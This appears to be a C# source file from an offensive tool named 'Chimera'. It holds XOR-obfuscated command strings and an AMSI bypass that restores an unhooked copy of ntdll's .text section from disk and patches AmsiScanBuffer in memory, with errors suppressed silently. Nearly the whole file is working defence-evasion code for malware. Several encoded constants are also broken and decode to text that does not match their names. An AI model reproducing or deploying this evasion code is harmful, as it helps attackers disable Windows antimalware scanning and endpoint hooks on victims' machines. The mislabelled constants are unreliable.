using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Chimera
{
    public static class StringHelper
    {
        private static readonly byte XorKey = 0x41;

        public static string Decode(byte[] encoded)
        {
            byte[] decoded = new byte[encoded.Length];
            for (int i = 0; i < encoded.Length; i++)
                decoded[i] = (byte)(encoded[i] ^ XorKey);
            return System.Text.Encoding.UTF8.GetString(decoded);
        }

        // Pre-encoded strings (XOR 0x41)
        public static readonly byte[] CMD     = { 0x22, 0x2C, 0x25, 0x60, 0x65, 0x60, 0x65 };
        public static readonly byte[] PS      = { 0x31, 0x2E, 0x36, 0x65, 0x32, 0x29, 0x65,
                                                   0x60, 0x63, 0x63, 0x60, 0x2D, 0x65, 0x60, 0x65 };
        public static readonly byte[] SLASH_C = { 0x6E, 0x22 };
        public static readonly byte[] POST    = { 0x11, 0x2E, 0x13, 0x15 };
        public static readonly byte[] GET     = { 0x16, 0x24, 0x15 };

        // ---------------------------------------------------------------
        // AMSI BYPASS + NTDLL UNHOOK
        // ---------------------------------------------------------------
        public static void BypassAMSI()
        {
            UnhookNtdll();
            PatchAmsi();
        }

        private static void UnhookNtdll()
        {
            try
            {
                string ntdllPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                    "ntdll.dll");
                byte[] unhookedBytes = File.ReadAllBytes(ntdllPath);

                IntPtr hNtdll = GetModuleHandle("ntdll.dll");
                if (hNtdll == IntPtr.Zero) return;

                // Parse DOS header
                var dos = ReadStruct<IMAGE_DOS_HEADER>(hNtdll);
                // Parse NT headers — Signature(4) + FileHeader(20) = 24 bytes before OptionalHeader
                var fileHdr = ReadStruct<IMAGE_FILE_HEADER>(hNtdll + dos.e_lfanew + 4);

                // Section table starts immediately after OptionalHeader
                // Use SizeOfOptionalHeader from the PE itself — correct for both x86 and x64
                int sectionTableOffset = dos.e_lfanew + 4
                                         + Marshal.SizeOf(typeof(IMAGE_FILE_HEADER))
                                         + fileHdr.SizeOfOptionalHeader;

                int sectionSize = Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER));
                uint textRVA = 0, textSize = 0, textRaw = 0;

                for (int i = 0; i < fileHdr.NumberOfSections; i++)
                {
                    var sec = ReadStruct<IMAGE_SECTION_HEADER>(
                        hNtdll + sectionTableOffset + i * sectionSize);
                    string name = System.Text.Encoding.ASCII.GetString(sec.Name).TrimEnd('\0');
                    if (name == ".text")
                    {
                        textRVA  = sec.VirtualAddress;
                        textSize = sec.SizeOfRawData;
                        textRaw  = sec.PointerToRawData;   // offset in the on-disk file
                        break;
                    }
                }
                if (textRVA == 0 || textSize == 0 || textRaw == 0) return;

                // Make .text writable
                uint oldProtect;
                VirtualProtect(hNtdll + (int)textRVA, textSize, 0x40, out oldProtect);

                // Copy from the on-disk file bytes using PointerToRawData as the source offset
                Marshal.Copy(unhookedBytes, (int)textRaw, hNtdll + (int)textRVA, (int)textSize);

                // Restore original protection
                VirtualProtect(hNtdll + (int)textRVA, textSize, oldProtect, out _);
            }
            catch { /* silent */ }
        }

        private static void PatchAmsi()
        {
            try
            {
                IntPtr amsi = LoadLibrary("amsi.dll");
                if (amsi == IntPtr.Zero) return;
                IntPtr fn = GetProcAddress(amsi, "AmsiScanBuffer");
                if (fn == IntPtr.Zero) return;

                // mov eax, 0x80070057 ; ret  → always returns AMSI_RESULT_CLEAN
                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                uint old;
                VirtualProtect(fn, (uint)patch.Length, 0x40, out old);
                Marshal.Copy(patch, 0, fn, patch.Length);
                VirtualProtect(fn, (uint)patch.Length, old, out _);
            }
            catch { /* silent */ }
        }

        // ---------------------------------------------------------------
        // Helpers
        // ---------------------------------------------------------------
        static T ReadStruct<T>(IntPtr address) where T : struct
        {
            return (T)Marshal.PtrToStructure(address, typeof(T));
        }

        // ---------------------------------------------------------------
        // P/Invoke — single declaration of each
        // ---------------------------------------------------------------
        [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hMod, string name);
        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32.dll")] static extern bool VirtualProtect(
            IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        // ---------------------------------------------------------------
        // PE Structs
        // ---------------------------------------------------------------
        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_DOS_HEADER
        {
            public UInt16 e_magic;
            public UInt16 e_cblp, e_cp, e_crlc, e_cparhdr,
                          e_minalloc, e_maxalloc, e_ss, e_sp,
                          e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]  public UInt16[] e_res;
            public UInt32 e_oemid, e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public UInt16[] e_res2;
            public Int32  e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] Name;
            public UInt32 VirtualSize;
            public UInt32 VirtualAddress;
            public UInt32 SizeOfRawData;
            public UInt32 PointerToRawData;
            public UInt32 PointerToRelocations;
            public UInt32 PointerToLinenumbers;
            public UInt16 NumberOfRelocations;
            public UInt16 NumberOfLinenumbers;
            public UInt32 Characteristics;
        }
    }
}
